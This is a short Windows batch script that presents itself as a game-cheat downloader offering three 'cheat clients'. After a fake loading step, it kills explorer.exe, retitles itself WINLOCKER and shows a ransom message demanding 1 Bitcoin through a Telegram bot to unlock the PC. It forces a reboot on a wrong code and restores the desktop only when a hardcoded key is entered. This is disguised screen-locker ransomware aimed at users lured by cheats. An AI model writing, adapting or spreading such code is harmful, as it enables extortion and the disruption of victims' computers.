@echo off
:main menu
title text
echo Hello you want play with cheats? if yes then choose cheat version and wait for the download cheats!

echo.
echo Ancient Client
echo Buivol Client
echo MR.BIG.DIK Client
echo.
set/p var=~$:
if %var%==Ancient goto Client
if %var%==Buivol goto Client
if %var%==MR.BIG.DIK goto Client

:Client
cls
echo Cheat Loading...
pause
echo Cheat Loaded!!!
pause

@echo off
Taskkill/f /im explorer.exe
Title WINLOCKER
color 4
cls
cls


echo 				Hello my friend! your pc has blocked because you play with cheats!

echo 				For unblocked your pc you need send 1 Bitcoin to this wallet: t.me/UnlokekBot!

echo 				And Then i give you link where the bot will give you the key!

echo 							good luck!

echo 							Enter Code

:h
set/p x=~$
if %x%== vt0krxji1heerzk@hqbf (echo win start
start explorer
exit
) else (
echo Your code not true!
shutdown /r
)
goto h


